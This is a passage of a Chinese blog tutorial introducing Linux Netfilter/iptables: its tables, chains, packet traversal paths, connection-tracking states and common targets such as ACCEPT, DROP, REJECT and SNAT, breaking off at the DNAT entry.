    <published>2014-12-01T16:00:00.000Z</published>
    <updated>2017-04-04T03:11:02.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本文尽量不涉及诸如iptables规则编写之类的技术细节，那些都是可以通过短暂的学习和实践掌握的。本文主要偏重在整体概念的介绍，和技术细节之外容易忽略却又很重要的点（比如过滤规则设计时需要遵从的一些“原则”），掌握不好这些点，编写一串过滤规则可能还是漏洞百出。</p>
</blockquote>
<h2 id="1-简述"><a href="#1-简述" class="headerlink" title="1. 简述"></a>1. 简述</h2><h3 id="1-1-Netfilter-iptables-介绍"><a href="#1-1-Netfilter-iptables-介绍" class="headerlink" title="1.1 Netfilter/iptables 介绍"></a>1.1 Netfilter/iptables 介绍</h3><hr>
<p>防火墙系统根据其工作方式的不同，主要可以分为 <strong>包过滤防火墙</strong>(也称“网络层防火墙”) 和 <strong>应用层防火墙</strong> ，<code>netfilter/iptables</code> 包过滤系统是包过滤防火墙的代表。</p>
<p>网络流量由 IP 信息包（或，简称 <em>信息包</em>）— 以流的形式从源系统传输到目的地系统的一些小块数据 — 组成。 这些信息包有 <strong>头</strong> ，即在每个包前面所附带的一些数据位，它们包含有关信息包的源、目的地和协议类型的信息。 防火墙根据一组规则检查这些头，以确定接受哪个信息包以及拒绝哪个信息包。该过程即为<strong>信息包过滤</strong>。</p>
<a id="more"></a> 
<p>netfilter/iptables 信息包过滤系统是一种功能强大的工具， 可用于添加、编辑和除去规则，这些规则是在做信息包过滤决定时，防火墙所遵循和组成的规则。这些规则存储在专用的信息包过滤表中， 而这些表集成在 Linux 内核中。 在信息包过滤表中，规则被分组放在 链（chain）中。</p>
<p>虽然 netfilter/iptables IP 信息包过滤系统被称为单个实体，但它实际上由两个组件 netfilter和 iptables 组成。</p>
<blockquote>
<p>netfilter 组件也称为 内核空间（kernelspace），是Linux内核中实现包过滤防火墙的内部结构由一些信息包过滤表组成，不以程序或文件的形式存在， 这些表包含内核用来控制信息包过滤处理的规则集，属于“内核态”（KernelSpace，又称内核空间）的防火墙功能体系。</p>
<p>iptables 组件是一种工具，也称为 用户空间（userspace），指的是用来管理Linux防火墙的命令程序，通常位于/sbin/iptables，属于“用户态”（UserSpace，又称用户空间）的防火墙管理体系，它使插入、修改和除去信息包过滤表中的规则变得容易。</p>
</blockquote>
<p>简单来说，<strong>Netfilter/iptables 是一套工具，Netfilter是“后台”，在内核空间里执行着防火墙的核心功能；iptables 是“前端”，在用户空间里与用户交互，是用户对Netfilter的管理与配置的“接口”</strong>。</p>
<h3 id="1-2-iptables-命令简介"><a href="#1-2-iptables-命令简介" class="headerlink" title="1.2 iptables 命令简介"></a>1.2 iptables 命令简介</h3><p>iptables 书写规则的命令格式是：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables [-t table] <span class="built_in">command</span> [match] [target/jump]</div></pre></td></tr></table></figure></p>
<p>关于上述命令格式中的 <code>command</code> 和 <code>match</code>，可以分别参考下面链接：</p>
<ol>
<li><a href="https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html#COMMANDS" target="_blank" rel="external">https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html#COMMANDS</a></li>
<li><a href="https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html#MATCHES" target="_blank" rel="external">https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html#MATCHES</a></li>
</ol>
<h2 id="2-Netfilter-iptables-组成结构"><a href="#2-Netfilter-iptables-组成结构" class="headerlink" title="2. Netfilter/iptables 组成结构"></a>2. Netfilter/iptables 组成结构</h2><h3 id="2-1-概要"><a href="#2-1-概要" class="headerlink" title="2.1 概要"></a>2.1 概要</h3><hr>
<p>Netfilter 由多个表(table)组成，每个表又由多个链(chain)组成(此处可以脑补二维数组的矩阵了)，链是存放过滤规则的“容器”，里面可以存放一个或多个iptables命令设置的过滤规则。目前的表有4个：<code>raw table</code>, <code>mangle table</code>, <code>nat table</code>, <code>filter table</code>。Netfilter 默认的链有：<code>INPUT</code>, <code>OUTPUT</code>, <code>FORWARD</code>, <code>PREROUTING</code>, <code>POSTROUTING</code>，根据<code>表</code>的不同功能需求，不同的表下面会有不同的链，链与表的关系可用下图直观表示：<br><img src="/imgs/1417143113650.png" alt="Alt text"></p>
<blockquote>
<p><strong>NOTE</strong>:<br>Netfilter各个表中的链，是可以由用户新建自定义的，命令 <code>iptables -t &lt;table&gt; -N &lt;new_chain&gt;</code> 即是在 <code>table</code> 表中新建一个用户自定义链<code>new_chain</code>。</p>
</blockquote>
<h3 id="2-2-RAW-表"><a href="#2-2-RAW-表" class="headerlink" title="2.2 RAW 表"></a>2.2 RAW 表</h3><hr>
<p>RAW 表是 Netfilter/iptables 新增的模块，在没打相关补丁的2.4与2.6版本Linux内核的系统上无法使用。</p>
<p>RAW表只用来实现一个功能：在数据包上做一个标记<code>NOTRACK</code>，该标记表明这个数据包不被后面启动的“连接状态跟踪机制”来跟踪这个数据包的状态。（后面会讲“连接状态”及其跟踪机制）。</p>
<p>要做到告诉“链接状态跟踪机制”不追踪某数据包，只能在该机制起作用之前在数据包上做一个标记，而其他的三个表都是工作在“链接状态跟踪机制”之中的，不能脱离该机制控制范围之外，所以唯一容易的做法就是这样额外单拉出一个表，工作在“链接状态跟踪机制”之外。</p>
<p><strong>RAW表只有<code>PREROUTING</code> 和 <code>OUTPUT</code> 两个链。</strong></p>
<h3 id="2-3-Mangle-表"><a href="#2-3-Mangle-表" class="headerlink" title="2.3 Mangle 表"></a>2.3 Mangle 表</h3><hr>
<p>Mangle 表主要用来mangle数据包，你可以使用mangle匹配来改变包的 TOS/TTL 等属性，具体有：</p>
<ul>
<li>TOS</li>
<li>TTL</li>
<li>MARK</li>
<li>SECMARK</li>
<li>CONNSECMARK</li>
</ul>
<p>关于这几个属性的详细资料，可以参考：<a href="https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html#MANGLETABLE" target="_blank" rel="external">https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html#MANGLETABLE</a></p>
<p><strong>Mange表可以操作5个链中的任何一个。</strong></p>
<h3 id="2-4-NAT-表"><a href="#2-4-NAT-表" class="headerlink" title="2.4 NAT 表"></a>2.4 NAT 表</h3><hr>
<p>顾名思义，这个表的功能主要实现 <strong>NAT</strong>（Network Address Translation，<strong>网络地址转换</strong>）的功能，实现的具体操作有以下4个：</p>
<ul>
<li>DNAT</li>
<li>SNAT</li>
<li>MASQUERADE</li>
<li>REDIRECT</li>
</ul>
<blockquote>
<p><strong>NOTE</strong>:<br><strong>NAT</strong> 表处理数据包有一个特点：只处理一个数据流的第一个数据包，后续的数据包会被自动匹配并做相同处理。</p>
</blockquote>
<p><strong>DNAT</strong> 操作主要用在这样一种情况，你有一个合法的IP地址，要把对防火墙的访问 重定向到其他的机子上（比如DMZ）。也就是说，我们改变的是目的地址，以使包能重路由到某台主机。修改目的ip地址的原因一般就是为了改变包发送的目的地，让包走出去，而不是留下来，所以在iptables中，DNAT是在入口，也即 <code>PREROUTING</code> 链中发挥作用，以便让包进入 <code>FORWARD</code> 表。</p>
<p><strong>SNAT</strong> 改变包的源地址，这在极大程度上可以隐藏你的本地网络或者DMZ等。一个 很好的例子是我们知道防火墙的外部地址，但必须用这个地址替换本地网络地址。有了这个操作，防火墙就 能自动地对包做SNAT和De-SNAT(就是反向的SNAT),以使LAN能连接到Internet。如果使用类似 192.168.0.0/24这样的地址，是不会从Internet得到任何回应的。因为IANA定义这些网络（还有其他的）为 私有的，只能用于LAN内部。修改源ip地址的目的一般都是为了让这个包能再回到自己这里，所以在iptables中，SNAT是在出口，也即 <code>POSTROUTING</code> 链发挥作用。</p>
<p><strong>MASQUERADE</strong> 的作用和 <strong>SNAT</strong> 完全一样，只是计算机 的负荷稍微多一点。因为对每个匹配的包，MASQUERADE 都要查找可用的 IP 地址，而 不象 SNAT 用的 IP 地址是配置好的。当然，这也有好处，就是我们可以使用通过 PPP、 PPPOE、SLIP 等拨号得到的地址，这些地址可是由 ISP 的 DHCP 随机分配的。</p>
<p><strong>NAT 表只包含 <code>PREROUTING</code> 、<code>POSTROUTING</code> 和 <code>OUTPUT</code> 3个链。</strong></p>
<h3 id="2-5-Filter-表"><a href="#2-5-Filter-表" class="headerlink" title="2.5 Filter 表"></a>2.5 Filter 表</h3><hr>
<p><code>Filter</code> 表用来过滤数据包，我们可以在任何时候匹配包并过滤它们，Netfilter/iptables 防火墙的<strong>包过滤</strong>功能主要由此实现。 我们就是在这里根据包的内容对包做DROP或ACCEPT的。当然，我们也可以预先在其他地方做些过滤，但是这 个表才是设计用来过滤的。几乎所有的target都可以在这儿使用。</p>
<p><strong><code>Filter</code> 表包含 <code>INPUT</code>, <code>OUTPUT</code> 和 <code>FORWARD</code> 3个链。</strong></p>
<h2 id="3-经过防火墙的数据流"><a href="#3-经过防火墙的数据流" class="headerlink" title="3. 经过防火墙的数据流"></a>3. 经过防火墙的数据流</h2><p>当数据包到达防火墙时，如果MAC地址符合，就会由内核里相应的驱动程序接收，然后会经过一系列操作，从而决定是发送给本地的程序，还是转发给其他机器，或者其他操作。然而，防火墙对于<strong>以本地地址为目标</strong>、<strong>以本地地址为源</strong>和<strong>被转发</strong>三种情况的数据包，具体操作有细微的差别，这些差别主要体现在不同的数据包会经过不同的Table，也会被不同Table中的不同的Chain来处理。详情如下：</p>
<h3 id="3-1-以本地地址为目标的数据包"><a href="#3-1-以本地地址为目标的数据包" class="headerlink" title="3.1 以本地地址为目标的数据包"></a>3.1 以本地地址为目标的数据包</h3><hr>
<table>
<thead>
<tr>
<th style="text-align:left">Step(步骤)</th>
<th style="text-align:left">Table(表)</th>
<th style="text-align:left">Chain(链)</th>
<th style="text-align:left">Comment(注释)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">在线路上传输(比如，Internet)</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">进入接口 (比如， eth0)</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">raw</td>
<td style="text-align:left">PREROUTING</td>
<td style="text-align:left">在链接追踪机制启动前，对当前链接设定不追踪状态的标记</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">mangle</td>
<td style="text-align:left">PREROUTING</td>
<td style="text-align:left">这个链用来mangle数据包，比如改变TOS等</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">nat</td>
<td style="text-align:left">PREROUTING</td>
<td style="text-align:left">这个链主要用来做DNAT。不要在这个链做过虑操作，因为某些情况下包会溜过去</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">路由判断，比如，包是发往本地的，还是要转发的</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">mangle</td>
<td style="text-align:left">INPUT</td>
<td style="text-align:left">在路由之后，被送往本地程序之前，mangle数据包</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">filter</td>
<td style="text-align:left">INPUT</td>
<td style="text-align:left">所有以本地为目的的包都要经过这个链，不管它们从哪儿 来，对这些包的过滤条件就设在这里</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">到达本地程序了(比如，服务程序或客户程序)</td>
</tr>
</tbody>
</table>
<h3 id="3-2-以本地地址为源的数据包"><a href="#3-2-以本地地址为源的数据包" class="headerlink" title="3.2 以本地地址为源的数据包"></a>3.2 以本地地址为源的数据包</h3><hr>
<table>
<thead>
<tr>
<th style="text-align:left">Step(步骤)</th>
<th style="text-align:left">Table(表)</th>
<th style="text-align:left">Chain(链)</th>
<th style="text-align:left">Comment(注释)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">本地程序（比如，服务程序或客户程序）</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">路由判断，要使用源地址，外出接口，还有其他一些信息</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">raw</td>
<td style="text-align:left">OUTPUT</td>
<td style="text-align:left">在链接追踪机制启动前，对当前链接设定不追踪状态的标记</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">mangle</td>
<td style="text-align:left">OUTPUT</td>
<td style="text-align:left">在这儿可以mangle包。建议不要在这儿做过滤，可能有副作用</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">nat</td>
<td style="text-align:left">OUTPUT</td>
<td style="text-align:left">这个链对从防火墙本身发出的包进行DNAT操作</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">filter</td>
<td style="text-align:left">OUTPUT</td>
<td style="text-align:left">对本地发出的包过滤</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">mangle</td>
<td style="text-align:left">POSTROUTING</td>
<td style="text-align:left">这条链主要在包DNAT之后(译者注：作者把这一次DNAT称作实际的路由，虽然在前面有一次路由。对于本地的包，一旦它被生成，就必须经过路由代码的处理，但这个包具体到哪儿去，要由NAT处理之后才能确定。所以把这称作实际的路由)，离开本地之前，对包 mangle。有两种包会经过这里，防火墙所在机子本身产生的包，还有被转发的包</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left">nat</td>
<td style="text-align:left">POSTROUTING</td>
<td style="text-align:left">在这里做SNAT。但不要在这里做过滤，因为有副作用，而且有些包是会溜过去的，即使你用了DROP策略</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">离开接口(比如： eth0)</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">在线路上传输(比如，Internet)</td>
</tr>
</tbody>
</table>
<h3 id="3-3-被转发的数据包"><a href="#3-3-被转发的数据包" class="headerlink" title="3.3 被转发的数据包"></a>3.3 被转发的数据包</h3><hr>
<table>
<thead>
<tr>
<th style="text-align:left">Step(步骤)</th>
<th style="text-align:left">Table(表)</th>
<th style="text-align:left">Chain(链)</th>
<th style="text-align:left">Comment(注释)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">在线路上传输(比如，Internet)</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">进入接口 (比如， eth0)</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">raw</td>
<td style="text-align:left">PREROUTING</td>
<td style="text-align:left">在链接追踪机制启动前，对当前链接设定不追踪状态的标记</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">mangle</td>
<td style="text-align:left">PREROUTING</td>
<td style="text-align:left">mangle数据包，比如修改TOS</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">nat</td>
<td style="text-align:left">PREROUTING</td>
<td style="text-align:left">这个链主要用来做DNAT。不要在这个链做过虑操作，因为某些情况下包会溜过去。稍后会做SNAT</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">路由判断，比如，包是发往本地的，还是要转发的</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">mangle</td>
<td style="text-align:left">FORWARD</td>
<td style="text-align:left">包继续被发送至mangle表的FORWARD链，这是非常特殊的情 况才会用到的。在这里，包被mangle。这次mangle发生在最初的路由判断之后， 在最后一次更改包的目的之前（译者注：就是下面的FORWARD链所做的，因其过滤功能，可能会改变一些包 的目的地，如丢弃包）</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left">filter</td>
<td style="text-align:left">FORWARD</td>
<td style="text-align:left">包继续被发送至这条FORWARD链。只有需要转发的包才会走 到这里，并且针对这些包的所有过滤也在这里进行。注意，所有要转发的包都要经过这里，不管是外网到内网的还是内网到外网的。在书写规则时，要考虑到这一点</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:left">mangle</td>
<td style="text-align:left">POSTROUTING</td>
<td style="text-align:left">这个链也是针对一些特殊类型的包（译者注：参考第6步， 我们可以发现，在转发包时，mangle表的两个链都用在特殊的应用上）。这一步mangle是在所有更改包的目 的地址的操作完成之后做的，但这时包还在本地上</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:left">nat</td>
<td style="text-align:left">POSTROUTING</td>
<td style="text-align:left">这个链就是用来做SNAT的，当然也包括Masquerade（伪 装）。但不要在这儿做过滤，因为某些包即使不满足条件也会通过</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">离开接口(比如： eth0)</td>
</tr>
<tr>
<td style="text-align:left">12</td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left">又在线路上传输了(比如，LAN)</td>
</tr>
</tbody>
</table>
<h3 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h3><p>如上所示，一个数据包要经历很多步骤，而且它们可以被阻拦在任何一条链上，或者是任何有问题的地方。 我们的主要兴趣是 iptables 的概貌。注意，对不同的接口，是没有什么特殊的链和表的。所有要经防火墙/ 路由器转发的包都要经过 FORWARD 链。</p>
<blockquote>
<p><strong>NOTE</strong>:<br>在上面的情况里，不要在 INPUT 链上做过滤。INPUT 专门用来操作那些以我们的机子为目的地址的数据包，它们不会被路由到其它地方。</p>
</blockquote>
<p>现在总结以上三种情况下，用到了哪些不同的链。图示如下：</p>
<p><img src="/imgs/1417415614723.png" alt="Alt text"></p>
<p>要弄清楚上面的图，可以这样考虑。在第一个路由判断处，不是发往本地的包，我们会发送它穿过 FORWARD链。若包的目的地是本地监听的IP地址，我们就会发送这个包穿过INPUT链，最后到达本地。</p>
<p>值得注意的是，在做NAT的过程中，发往本机的包的目的地址可能会在PREROUTING链里被改变。这个操作发生在第一次路由之前，所以在地址被改变之后，才能对包进行路由。注意，所有的包都会经过上图中的某一条路径。如果你把一个包DNAT回它原来的网络，这个包会继续走完相应路径上剩下的链，直到它被发送回原来的网络。</p>
<blockquote>
<p><strong>NOTE</strong>:<br>上面的流程介绍中，每一次经过 RAW 表中的一个链的处理，防火墙系统就对当前数据流开启了连接状态追踪机制，除非再 RAW 表中设定了不追踪标志。</p>
</blockquote>
<h2 id="4-链接状态"><a href="#4-链接状态" class="headerlink" title="4. 链接状态"></a>4. 链接状态</h2><h3 id="4-1-简述"><a href="#4-1-简述" class="headerlink" title="4.1 简述"></a>4.1 简述</h3><hr>
<p>状态机制是iptables中特殊的一部分，其实它不应该叫状态机制，因为它只是一种连接跟踪机制。但 是，很多人都认可状态机制这个名字。连接跟踪可以让 Netfilter 知道某个特定连接的状态。运行连接跟踪的防火墙称作 <strong>带有状态机制的防火墙</strong>，以下简称为<strong>状态防火墙</strong>。状态防火墙比非状态防火墙要安全，因为它允许我们编写更严密的规则。</p>
<p>在 iptables 里，包是和被跟踪连接的五种不同状态有关的。它们是 <code>NEW</code>，<code>ESTABLISHED</code>，<code>RELATED</code>， <code>INVALID</code> 和 <code>UNTRACKED</code>。 后面我们会深入地讨论每一个状态。使用 <code>--state</code> 匹配操作，我们能很容易地控制 “谁或什么能发起新的会话”。</p>
<p>所有在内核中由 Netfilter 的特定框架做的连接跟踪称作 <code>conntrack</code>（即 <code>connection tracking</code> 的联合缩写）。<code>conntrack</code> 可以作为模块安装，也可以作为内核的一部分。大部分情况下，我们想要，也 需要更详细的连接跟踪，这是相比于缺省的 <code>conntrack</code> 而言。也因为此，<code>conntrack</code> 中有许多用来处理 <code>TCP</code>，<code>UDP</code> 或 <code>ICMP</code> 协议的部件。这些模块从数据包中提取详细的、唯一的信息，因此能保持对每一个数据流的跟踪。这些信息也告知 <code>conntrack</code> 流当前的状态。例如，<code>UDP</code> 流一般由他们的目的地址、源地址、目的端口和源端口唯一确定。</p>
<p>在以前的内核里，我们可以打开或关闭重组功能。然而，自从 Netfilter/iptables ，尤其是连接跟踪被引入内核，这个选项就被取消了。因为没有包的重组，连接跟踪就不能正常工作。现在重组已经整合入 <code>conntrack</code> ，并且在 <code>conntrack</code> 启动时自动启动。不要关闭重组功能，除非你要关闭连接跟踪。</p>
<p>除了本地产生的包由 OUTPUT 链处理外，所有连接跟踪都是在 PREROUTING 链里进行处理的，意思就是， iptables 会在 PREROUTING 链里从新计算所有的状态。如果我们发送一个流的初始化包，状态就会在 OUTPUT 链里被设置为 <code>NEW</code>，当我们收到回应的包时，状态就会在 PREROUTING 链里被设置为<code>ESTABLISHED</code> 。如果第一个包不是本地产生的，那就会在 PREROUTING 链里被设置为 <code>NEW</code> 状态。综上，所有状态的改变和计算都是在 nat 表中的 PREROUTING 链和 OUTPUT 链里完成的。</p>
<blockquote>
<p><strong>NOTE</strong>:<br>在内和空间中，Netfilter 的 <code>conntrack</code> 机制对数据包的状态标记粒度较细，比较繁琐复杂，包的状态依据其包含的协议不同而不同。详见 《<a href="https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html#THECONNTRACKENTRIES" target="_blank" rel="external">iptables 指南 1.1.19——contrack记录</a>》</p>
</blockquote>
<h3 id="4-2-数据包在用户空间的状态"><a href="#4-2-数据包在用户空间的状态" class="headerlink" title="4.2 数据包在用户空间的状态"></a>4.2 数据包在用户空间的状态</h3><hr>
<p>上面说过在内核空间中，防火墙核心对数据包的状态追踪比较繁杂，但在用户空间中（即 iptables 可控的状态），网络链接的状态只有5个： <code>NEW</code>，<code>ESTABLISHED</code>，<code>RELATED</code>， <code>INVALID</code> 和 <code>UNTRACKED</code>。 ，详情见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:left">State(状态)</th>
<th style="text-align:left">Explanation(说明)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>NEW</strong></td>
<td style="text-align:left"><code>NEW</code> 说明这个包是我们看到的第一个 包。意思就是，这是 <code>conntrack</code> 模块看到的某个连接第一个包，它即将被匹配了。比如，我们看到一个 <code>SYN</code> 包，是我们所留意的连接的第一个包，就要匹配它。第一个包也可能不是 <code>SYN</code> 包，但它仍会被认为是 <code>NEW</code> 状态。这样做有时会导致一些问题，但对某些情况是有非常大的帮助的。例如，在我们想恢复某条从其他的防火墙丢失的连接时，或者某个连接已经超时，但实际上并未关闭时。</td>
</tr>
<tr>
<td style="text-align:left"><strong>ESTABLISHED</strong></td>
<td style="text-align:left"><code>ESTABLISHED</code>已经注意到两个方向上 的数据传输，而且会继续匹配这个连接的包。处于<code>ESTABLISHED</code>状态的连接非常容易理解。只要发送并接到应答，连接就是<code>ESTABLISHED</code>的了。一个连接要从<code>NEW</code>变 为<code>ESTABLISHED</code>，只需要接到应答包即可，不管这个包是发往防火墙的，还是要由防火墙转发的。<code>ICMP</code>的错误和重定向等信息包也被看作是<code>ESTABLISHED</code>，只要它们是我 们所发出的信息的应答。</td>
</tr>
<tr>
<td style="text-align:left"><strong>RELATED</strong></td>
<td style="text-align:left"><code>RELATED</code>是个比较麻烦的状态。当一个连接和某个已处于ESTABLISHED状态的连接有关系时，就被认为是<code>RELATED</code>的了。换句话说，一个连接要想是<code>RELATED</code>的，首先要有一个<code>ESTABLISHED</code>的连接。这个<code>ESTABLISHED</code>连接再产生一个主连接之外的连接，这个新的连接就是<code>RELATED</code>的了，当然前提是<code>conntrack</code>模块要能理解<code>RELATED</code>。<code>ftp</code>是个很好的例子，<code>FTP-data</code>连接就是和<code>FTP-control</code>有<code>RELATED</code>的。还有其他的例子，比如，通过IRC的DCC连接。有了这个状态，ICMP应 答、FTP传输、DCC等才能穿过防火墙正常工作。注意，大部分还有一些UDP协议都依赖这个机制。这些协议 是很复杂的，它们把连接信息放在数据包里，并且要求这些信息能被正确理解。</td>
</tr>
<tr>
<td style="text-align:left"><strong>INVALID</strong></td>
<td style="text-align:left"><code>INVALID</code>说明数据包不能被识别属于 哪个连接或没有任何状态。有几个原因可以产生这种情况，比如，内存溢出，收到不知属于哪个连接的<code>ICMP</code>错误信息。一般地，我们<code>DROP</code>这个状态的任何东西。</td>
</tr>
<tr>
<td style="text-align:left"><strong>UNTRACKED</strong></td>
<td style="text-align:left"><code>UNTRACKED</code>状态，简单来说就是该链接在经过<code>RAW</code>表时，被做了不追踪标记<code>NOTRACK</code>。同时也意味着与该链接所有相关的链接（具有<code>RELATED</code>标志）也不会被链接追踪机制追踪到，所以在对一个链接设置不追踪标记时，一定要谨慎。比如有的链接可能由于网络问题收到<code>ICMP</code>消息，但被标记为<code>NOTRACK</code>的链接就收不到相应的<code>ICMP</code>消息</td>
</tr>
</tbody>
</table>
<h2 id="5-target-jump"><a href="#5-target-jump" class="headerlink" title="5. target/jump"></a>5. target/jump</h2><p><code>target/jump</code> 决定符合条件的包到何处去，语法是 <code>--jump target</code> 或 <code>-j target</code>。（<code>target</code> 细分为两类，即 <code>target</code> 和 <code>jump</code> 。它们 唯一的区别是 <code>jump</code> 的目标是一个在同一个表内的链，而 <code>target</code> 的目标是具体的操作。），常用的几个 TARGET 如下表所示：</p>
<table>
<thead>
<tr>
<th style="text-align:left">TARGET</th>
<th style="text-align:left">Explanation</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>ACCEPT</strong></td>
<td style="text-align:left">这个target没有任何选项和参数，使用也很简单，指定<code>-j ACCEPT</code>即可。一旦包满足了指定的匹配条件，就会被<code>ACCEPT</code>，并且<strong>不会再去匹配当前链中的其他规则或同一个表内的其他规则</strong>， 但<strong>它还要通过其他表中的链</strong>，而且在那儿可能会被<code>DROP</code>掉</td>
</tr>
<tr>
<td style="text-align:left"><strong>DROP</strong></td>
<td style="text-align:left">顾名思义，如果包符合条件，这个target就会把它丢掉，也就是说包的生命到此结束，不会再向前走一 步，效果就是包被阻塞了。在某些情况下，这个target会引起意外的结果，因为它不会向发送者返回任何信 息，也不会向路由器返回信息，这就可能会使连接的另一方的sockets因苦等回音而亡。解决这个问题的较好的办法是使用<code>REJECT</code> target，（因为它在丢弃包的同时还会向发送者返回一个错误信息，这样另一方就能正常结束），尤其是在阻止端口扫描工具获得更多的信息时，可以隐蔽被过滤掉的端口等等（因为扫描工具扫描一个端口时，如果没有返回信息，一般会认为端口未打开或被防火墙等设备过滤掉了）。还要注意<strong>如果包在子链中被DROP了，那么它在主链里也不会再继续前进，不管是在当前的表还是在其他表里</strong>。总之，包死翘翘了。</td>
</tr>
<tr>
<td style="text-align:left"><strong>REJECT</strong></td>
<td style="text-align:left"><code>REJECT</code>和<code>DROP</code>基本一样，区别在于它除了阻塞包之外， 还向发送者返回错误信息。现在，此target还只能用在<code>INPUT</code>、<code>FORWARD</code>、<code>OUTPUT</code>和它们的子链里，而且<strong>包含 <code>REJECT</code>的链也只能被它们调用</strong>，否则不能发挥作用。它只有一个选项，用来控制返回的错误信息的种类</td>
</tr>
<tr>
<td style="text-align:left"><strong>REDIRECT</strong></td>
<td style="text-align:left">在防火墙所在的主机内部转发包或流到另一个端口。比如，我们可以把所有去往端口HTTP的包REDIRECT到HTTP proxy（例如squid），当然这都发生在我们自己的主机内部。本地生成的包都会被映射到127.0.0.1。换句 话说，这个target把要转发的包的目的地址改写为我们自己主机的IP。我们在做透明代理（LAN内的机子根 本不需要知道代理的存在就可以正常上网）时，这个target起了很大作用</td>
</tr>
<tr>
<td style="text-align:left"><strong>RETURN</strong></td>
<td style="text-align:left">它使包返回上一层，顺序是：<code>子链——&gt;父链——&gt;缺省</code>的策略。具体地说，就是若包在子链 中遇到了<code>RETURN</code>，则返回父链的下一条规则继续进行条件的比较，若是在父链（或称主链，比如<code>INPUT</code>）中 遇到了RETURN，就要被缺省的策略（一般是ACCEPT或DROP）操作了。（这很象C语言中函数返回值的情况）。举例说明：假设一个包进入了<code>INPUT</code>链，匹配了某条target为<code>--jump EXAMPLE_CHAIN</code>规则，然后进入了子链<code>EXAMPLE_CHAIN</code>。在子链中又匹配了某条 规则，恰巧target是<code>--jump RETURN</code>，那包就返回<code>INPUT链</code>了。如果在<code>INPUT</code>链里又遇 到了<code>--jump RETURN</code>，那这个包就要交由缺省的策略来处理了。</td>
</tr>
<tr>
<td style="text-align:left"><strong>SNAT</strong></td>
<td style="text-align:left">这个target是用来做源网络地址转换的，就是重写包的<strong>源IP地址</strong>。当我们有几个机子共享一个Internet 连接时，就能用到它了。先在内核里打开ip转发功能，然后再写一个SNAT规则，就 可以把所有从本地网络出去的包的源地址改为Internet连接的地址了。如果我们不这样做而是直接转发本地网的包的话，Internet上的机子就不知道往哪儿发送应答了，因为在本地网里我们一般使用的是IANA组织专门指定的一段地址，它们是不能在Internet上使用的。SNAT target的作用就是让所有从本地网出发的包看起来都是从一台机子发出的，这台机子一般就是防火墙。SNAT只能用在<code>nat</code>表的<code>POSTROUTING</code>链里。<strong>只要连接的第一个符合条件的包被SNAT了，那么这个连接的其他所有的包都会自动地被SNAT,而且这个规则还会应用于这个连接所在流的所有数据包</strong></td>
</tr>
<tr>
<td style="text-align:left"><strong>DNAT</strong></td>
